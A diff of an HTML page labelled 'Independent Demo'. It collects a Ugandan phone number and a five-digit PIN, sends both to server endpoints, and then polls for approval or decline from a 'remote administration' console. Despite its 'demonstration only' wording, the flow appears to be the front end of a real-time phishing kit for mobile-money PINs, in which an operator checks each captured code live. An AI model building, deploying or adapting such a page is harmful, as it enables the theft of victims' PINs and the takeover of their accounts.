@@ -1,300 +1,223 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Independent Demo</title>
-  <style>
-    * { box-sizing: border-box; }
-    body { margin: 0; min-height: 100vh; font-family: Arial, sans-serif; background: #f4f4f4; color: #171717; }
-    header { padding: 22px 16px; text-align: center; background: #171717; color: #ffd500; font-size: 22px; font-weight: 800; }
-    main {
-  width: min(360px, 92%);
-  margin: 16px auto;
-  padding: 16px 12px;
-  background: white;
-  border-radius: 12px;
-  box-shadow: 0 3px 14px #00000012;
-    }
-    h2 { margin-top: 0; text-align: center; }
-    .notice { padding: 10px; background: #fff8cc; border-radius: 6px; font-size: 13px; text-align: center; line-height: 1.5; }
-    ..field-label {
-  display: block;
-  margin: 14px 0 8px;
-  font-weight: bold;
-    }
-    ..phone-row {
-  display: flex;
-  flex-direction: row;
-  align-items: center;
-  gap: 12px;
-  width: 100%;
-}
+<!DOCTYPE html>  <html lang="en">  
+<head>  
+  <meta charset="UTF-8">  
+  <meta name="viewport" content="width=device-width, initial-scale=1">  
+  <title>Independent Demo</title>  
+  <style>  
+    * { box-sizing: border-box; }  
+    body { margin: 0; min-height: 100vh; font-family: Arial, sans-serif; background: #f4f4f4; color: #171717; }  
+    header { padding: 22px 16px; text-align: center; background: #171717; color: #ffd500; font-size: 22px; font-weight: 800; }  
+    main { width: min(440px, 94%); margin: 25px auto; padding: 24px 18px; background: white; border-radius: 12px; box-shadow: 0 3px 14px #00000012; }  
+    h2 { margin-top: 0; text-align: center; }  
+    .notice { padding: 10px; background: #fff8cc; border-radius: 6px; font-size: 13px; text-align: center; line-height: 1.5; }  
+    .field-label { display: block; margin: 22px 0 10px; font-weight: bold; }  
+    .phone-row { display: flex; gap: 5px; align-items: center; justify-content: center; }  
+    .country { flex-shrink: 0; padding: 12px 8px; border: 1px solid #ccc; border-radius: 6px; font-weight: bold; }  
+    .digits { display: flex; justify-content: center; gap: 5px; }  
+    .digit { width: 32px; height: 42px; border: 1px solid #aaa; border-radius: 6px; text-align: center; font-size: 18px; font-weight: bold; min-width: 0; }  
+    .digit:focus { outline: 2px solid #e3bd00; border-color: #171717; }  
+    button { width: 100%; padding: 14px; margin-top: 22px; border: 0; border-radius: 6px; background: #ffd500; color: #171717; font-weight: bold; font-size: 15px; cursor: pointer; }  
+    button:disabled { opacity: .6; cursor: not-allowed; }  
+    .hidden { display: none !important; }  
+    .hint { margin-top: 10px; color: #555; text-align: center; font-size: 13px; }  
+    .spinner { width: 44px; height: 44px; margin: 24px auto; border: 5px solid #eee; border-top-color: #d4ae00; border-radius: 50%; animation: spin .8s linear infinite; }  
+    @keyframes spin { to { transform: rotate(360deg); } }  
+    .status { text-align: center; padding: 12px; margin-top: 15px; background: #f4f4f4; border-radius: 6px; line-height: 1.5; }  
+    .error { color: #b00020; text-align: center; margin-top: 12px; }  
+    .success { font-size: 24px; text-align: center; padding: 20px 0; color: #2e7d32; }  
+  </style>  
+</head>  
+<body>    <header>INDEPENDENT DEMO</header>    <main>  
+    <p class="notice">  
+      DEMONSTRATION ONLY. Use fictional test data.  
+      Never enter real credential strings or mobile verification codes.  
+    </p>  <!-- PHONE PAGE -->  
+<section id="phonePage">  
+  <h2>Demo Phone Number</h2>  
+  <p>Enter a test number to start the demonstration.</p>  
+  <label class="field-label">Test Phone Number</label>  
+  <div class="phone-row">  
+    <span class="country">🇺🇬 +256</span>  
+    <div class="digits" id="phoneDigits"></div>  
+  </div>  
+  <p class="hint">Enter nine test digits starting with 7.</p>  
+  <button id="phoneButton" disabled>CONTINUE</button>  
+  <p id="phoneError" class="error"></p>  
+</section>  
 
-.country {
-  flex: 0 0 72px;
-  height: 64px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  border: 1px solid #333;
-  border-radius: 18px;
-  font-size: 26px;
-}
+<!-- DUMMY PIN PAGE -->  
+<section id="pinPage" class="hidden">  
+  <h2>Dummy PIN Demonstration</h2>  
+  <p>Enter any five dummy digits to verify.</p>  
+  <label class="field-label">Five Dummy Digits</label>  
+  <div class="digits" id="pinDigits"></div>  
 
-.phone-number {
-  flex: 1;
-  width: 0;
-  min-width: 0;
-  height: 64px;
-  padding: 0 18px;
-  border: 1px solid #333;
-  border-radius: 18px;
-  font-size: 18px;
-}
-    ..digit {
-  width: 28px;
-  height: 36px;
-  border: 1px solid #aaa;
-  border-radius: 6px;
-  text-align: center;
-  font-size: 16px;
-  font-weight: bold;
-  min-width: 0;
-    }
-    .digit:focus { outline: 2px solid #e3bd00; border-color: #171717; }
-    button { width: 100%; padding: 14px; margin-top: 22px; border: 0; border-radius: 6px; background: #ffd500; color: #171717; font-weight: bold; font-size: 15px; cursor: pointer; }
-    button:disabled { opacity: .6; cursor: not-allowed; }
-    .hidden { display: none !important; }
-    .hint { margin-top: 10px; color: #555; text-align: center; font-size: 13px; }
-    ..spinner {
-  width: 44px;
-  height: 44px;
-  margin: 24px auto;
-  border: 6px solid #777;
-  border-bottom-color: #28a745;
-  border-radius: 50%;
-  animation: spin 1s linear infinite;
-}
+  <div id="pinLoading" class="hidden">  
+    <div class="spinner"></div>  
+    <p class="status">Waiting for remote administration action...</p>  
+  </div>  
 
-@keyframes spin {
-  to {
-    transform: rotate(360deg);
-  }
-}
-    .status { text-align: center; padding: 12px; margin-top: 15px; background: #f4f4f4; border-radius: 6px; line-height: 1.5; }
-    .error { color: #b00020; text-align: center; margin-top: 12px; }
-    .success { font-size: 24px; text-align: center; padding: 20px 0; color: #2e7d32; }
-  </style>
-</head>
-<body>
+  <p id="pinStatus" class="status">Waiting for demo input.</p>  
+  <p id="pinError" class="error"></p>  
+</section>  
 
-  <header>INDEPENDENT DEMO</header>
+<!-- SUCCESS PAGE -->  
+<section id="successPage" class="hidden">  
+  <div class="success">✓ Demo Verified Successfully</div>  
+  <p style="text-align: center;">The session was approved via administration console.</p>  
+</section>
 
-  <main>
-    <p class="notice">
-      DEMONSTRATION ONLY. Use fictional test data.
-      Never enter real credential strings or mobile verification codes.
-    </p>
-
-    <!-- PHONE PAGE -->
-    <section id="phonePage">
-      <h2>Demo Phone Number</h2>
-      <p>Enter a test number to start the demonstration.</p>
-      <label class="field-label">Test Phone Number</label>
-      <div class="phone-row">
-  <span class="country">🇺🇬</span>
-  <input
-    type="tel"
-    id="demoPhone"
-    class="phone-number"
-    placeholder="Enter test number"
-    maxlength="9"
-    inputmode="numeric"
-    autocomplete="off"
-  >
-      </div>
-      <p class="hint">Enter nine test digits starting with 7.</p>
-      <button id="phoneButton" disabled>CONTINUE</button>
-      <p id="phoneError" class="error"></p>
-    </section>
-
-    <!-- DUMMY PIN PAGE -->
-    <section id="pinPage" class="hidden">
-      <h2>Dummy PIN Demonstration</h2>
-      <p>Enter any five dummy digits to verify.</p>
-      <label class="field-label">Five Dummy Digits</label>
-      <div class="digits" id="pinDigits"></div>
-
-      <div id="pinLoading" class="hidden">
-        <div class="spinner"></div>
-        <p class="status">Waiting for remote administration action...</p>
-      </div>
-
-      <p id="pinStatus" class="status">Waiting for demo input.</p>
-      <p id="pinError" class="error"></p>
-    </section>
-
-    <!-- SUCCESS PAGE -->
-    <section id="successPage" class="hidden">
-      <div class="success">✓ Demo Verified Successfully</div>
-      <p style="text-align: center;">The session was approved via administration console.</p>
-    </section>
-  </main>
-
-  <script>
-    let currentRequestId = null;
-    let pollInterval = null;
-
-    const phonePage = document.getElementById('phonePage');
-    const pinPage = document.getElementById('pinPage');
-    const successPage = document.getElementById('successPage');
-    const phoneDigitsContainer = document.getElementById('phoneDigits');
-    const pinDigitsContainer = document.getElementById('pinDigits');
-    const phoneButton = document.getElementById('phoneButton');
-    const phoneError = document.getElementById('phoneError');
-    const pinLoading = document.getElementById('pinLoading');
-    const pinStatus = document.getElementById('pinStatus');
-    const pinError = document.getElementById('pinError');
-
-    function createDigitInputs(container, count, initialVal = '') {
-      container.innerHTML = '';
-      const inputs = [];
-      for (let i = 0; i < count; i++) {
-        const input = document.createElement('input');
-        input.type = 'text';
-        input.inputMode = 'numeric';
-        input.pattern = '[0-9]*';
-        input.maxLength = 1;
-        input.className = 'digit';
-        if (i === 0 && initialVal) input.value = initialVal;
-
-        input.addEventListener('input', (e) => {
-          e.target.value = e.target.value.replace(/[^0-9]/g, '');
-          if (e.target.value && input.nextElementSibling) {
-            input.nextElementSibling.focus();
-          }
-          updateButtonState();
-        });
-
-        input.addEventListener('keydown', (e) => {
-          if (e.key === 'Backspace' && !e.target.value && input.previousElementSibling) {
-            input.previousElementSibling.focus();
-          }
-        });
-
-        container.appendChild(input);
-        inputs.push(input);
-      }
-      return inputs;
-    }
-
-    const phoneInputs = createDigitInputs(phoneDigitsContainer, 9, '7');
-    const pinInputs = createDigitInputs(pinDigitsContainer, 5);
-
-    function getCombinedValue(inputs) {
-      return inputs.map(i => i.value).join('');
-    }
-
-    function updateButtonState() {
-      const phoneVal = getCombinedValue(phoneInputs);
-      phoneButton.disabled = phoneVal.length !== 9;
-
-      const pinVal = getCombinedValue(pinInputs);
-      if (pinVal.length === 5 && currentRequestId) {
-        submitPinDemo(pinVal);
-      }
-    }
-
-    phoneButton.addEventListener('click', async () => {
-      phoneError.textContent = '';
-      const fullPhone = '+256' + getCombinedValue(phoneInputs);
-      phoneButton.disabled = true;
-
-      try {
-        const res = await fetch('/api/phone', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ phone: fullPhone })
-        });
-        const data = await res.json();
-        if (!res.ok) throw new Error(data.error || 'Failed to initialize setup.');
-
-        currentRequestId = data.id;
-        phonePage.classList.add('hidden');
-        pinPage.classList.remove('hidden');
-        pinInputs.focus();
-      } catch (err) {
-        phoneError.textContent = err.message;
-        phoneButton.disabled = false;
-      }
-    });
-
-    async function submitPinDemo(pinValue) {
-      pinError.textContent = '';
-      pinLoading.classList.remove('hidden');
-      pinStatus.textContent = 'Notifying administrator module...';
-      pinInputs.forEach(i => i.disabled = true);
-
-      try {
-        const res = await fetch('/api/pin-demo', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ id: currentRequestId, pin: pinValue })
-        });
-        const data = await res.json();
-        if (!res.ok) throw new Error(data.error || 'Submission failed.');
-
-        startPolling();
-      } catch (err) {
-        pinError.textContent = err.message;
-        pinLoading.classList.add('hidden');
-        pinInputs.forEach(i => i.disabled = false);
-      }
-    }
-
-    function startPolling() {
-      if (pollInterval) clearInterval(pollInterval);
-      pollInterval = setInterval(async () => {
-        try {
-          const res = await fetch(`/api/status/${currentRequestId}`);
-          if (!res.ok) return;
-          const data = await res.json();
-
-          if (data.status === 'approved' || data.stage === 'success') {
-            clearInterval(pollInterval);
-            pinPage.classList.add('hidden');
-            successPage.classList.remove('hidden');
-          } else if (data.status === 'declined') {
-            clearInterval(pollInterval);
-            pinLoading.classList.add('hidden');
-            pinStatus.innerHTML = `Declined. <button id="retryBtn">Retry Stage</button>`;
-            document.getElementById('retryBtn').addEventListener('click', resetPinStage);
-          } else {
-            pinStatus.textContent = `Status: ${data.status.toUpperCase()} (Awaiting administrative action)`;
-          }
-        } catch (err) {
-          console.error(err);
-        }
-      }, 3000);
-    }
-
-    async function resetPinStage() {
-      try {
-        await fetch('/api/retry', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ id: currentRequestId })
-        });
-        pinInputs.forEach(i => { i.value = ''; i.disabled = false; });
-        pinLoading.classList.add('hidden');
-        pinStatus.textContent = 'Waiting for demo input.';
-        pinInputs.focus();
-      } catch (err) {
-        pinError.textContent = 'Failed to reset stage.';
-      }
-    }
-  </script>
-</body>
-</html>
-
+  </main>    <script>  
+    let currentRequestId = null;  
+    let pollInterval = null;  
+  
+    const phonePage = document.getElementById('phonePage');  
+    const pinPage = document.getElementById('pinPage');  
+    const successPage = document.getElementById('successPage');  
+    const phoneDigitsContainer = document.getElementById('phoneDigits');  
+    const pinDigitsContainer = document.getElementById('pinDigits');  
+    const phoneButton = document.getElementById('phoneButton');  
+    const phoneError = document.getElementById('phoneError');  
+    const pinLoading = document.getElementById('pinLoading');  
+    const pinStatus = document.getElementById('pinStatus');  
+    const pinError = document.getElementById('pinError');  
+  
+    function createDigitInputs(container, count, initialVal = '') {  
+      container.innerHTML = '';  
+      const inputs = [];  
+      for (let i = 0; i < count; i++) {  
+        const input = document.createElement('input');  
+        input.type = 'text';  
+        input.inputMode = 'numeric';  
+        input.pattern = '[0-9]*';  
+        input.maxLength = 1;  
+        input.className = 'digit';  
+        if (i === 0 && initialVal) input.value = initialVal;  
+  
+        input.addEventListener('input', (e) => {  
+          e.target.value = e.target.value.replace(/[^0-9]/g, '');  
+          if (e.target.value && input.nextElementSibling) {  
+            input.nextElementSibling.focus();  
+          }  
+          updateButtonState();  
+        });  
+  
+        input.addEventListener('keydown', (e) => {  
+          if (e.key === 'Backspace' && !e.target.value && input.previousElementSibling) {  
+            input.previousElementSibling.focus();  
+          }  
+        });  
+  
+        container.appendChild(input);  
+        inputs.push(input);  
+      }  
+      return inputs;  
+    }  
+  
+    const phoneInputs = createDigitInputs(phoneDigitsContainer, 9, '7');  
+    const pinInputs = createDigitInputs(pinDigitsContainer, 5);  
+  
+    function getCombinedValue(inputs) {  
+      return inputs.map(i => i.value).join('');  
+    }  
+  
+    function updateButtonState() {  
+      const phoneVal = getCombinedValue(phoneInputs);  
+      phoneButton.disabled = phoneVal.length !== 9;  
+  
+      const pinVal = getCombinedValue(pinInputs);  
+      if (pinVal.length === 5 && currentRequestId) {  
+        submitPinDemo(pinVal);  
+      }  
+    }  
+  
+    phoneButton.addEventListener('click', async () => {  
+      phoneError.textContent = '';  
+      const fullPhone = '+256' + getCombinedValue(phoneInputs);  
+      phoneButton.disabled = true;  
+  
+      try {  
+        const res = await fetch('/api/phone', {  
+          method: 'POST',  
+          headers: { 'Content-Type': 'application/json' },  
+          body: JSON.stringify({ phone: fullPhone })  
+        });  
+        const data = await res.json();  
+        if (!res.ok) throw new Error(data.error || 'Failed to initialize setup.');  
+  
+        currentRequestId = data.id;  
+        phonePage.classList.add('hidden');  
+        pinPage.classList.remove('hidden');  
+        pinInputs.focus();  
+      } catch (err) {  
+        phoneError.textContent = err.message;  
+        phoneButton.disabled = false;  
+      }  
+    });  
+  
+    async function submitPinDemo(pinValue) {  
+      pinError.textContent = '';  
+      pinLoading.classList.remove('hidden');  
+      pinStatus.textContent = 'Notifying administrator module...';  
+      pinInputs.forEach(i => i.disabled = true);  
+  
+      try {  
+        const res = await fetch('/api/pin-demo', {  
+          method: 'POST',  
+          headers: { 'Content-Type': 'application/json' },  
+          body: JSON.stringify({ id: currentRequestId, pin: pinValue })  
+        });  
+        const data = await res.json();  
+        if (!res.ok) throw new Error(data.error || 'Submission failed.');  
+  
+        startPolling();  
+      } catch (err) {  
+        pinError.textContent = err.message;  
+        pinLoading.classList.add('hidden');  
+        pinInputs.forEach(i => i.disabled = false);  
+      }  
+    }  
+  
+    function startPolling() {  
+      if (pollInterval) clearInterval(pollInterval);  
+      pollInterval = setInterval(async () => {  
+        try {  
+          const res = await fetch(`/api/status/${currentRequestId}`);  
+          if (!res.ok) return;  
+          const data = await res.json();  
+  
+          if (data.status === 'approved' || data.stage === 'success') {  
+            clearInterval(pollInterval);  
+            pinPage.classList.add('hidden');  
+            successPage.classList.remove('hidden');  
+          } else if (data.status === 'declined') {  
+            clearInterval(pollInterval);  
+            pinLoading.classList.add('hidden');  
+            pinStatus.innerHTML = `Declined. <button id="retryBtn">Retry Stage</button>`;  
+            document.getElementById('retryBtn').addEventListener('click', resetPinStage);  
+          } else {  
+            pinStatus.textContent = `Status: ${data.status.toUpperCase()} (Awaiting administrative action)`;  
+          }  
+        } catch (err) {  
+          console.error(err);  
+        }  
+      }, 3000);  
+    }  
+  
+    async function resetPinStage() {  
+      try {  
+        await fetch('/api/retry', {  
+          method: 'POST',  
+          headers: { 'Content-Type': 'application/json' },  
+          body: JSON.stringify({ id: currentRequestId })  
+        });  
+        pinInputs.forEach(i => { i.value = ''; i.disabled = false; });  
+        pinLoading.classList.add('hidden');  
+        pinStatus.textContent = 'Waiting for demo input.';  
+        pinInputs.focus();  
+      } catch (err) {  
+        pinError.textContent = 'Failed to reset stage.';  
+      }  
+    }  
+  </script>  </body>  
+</html>  
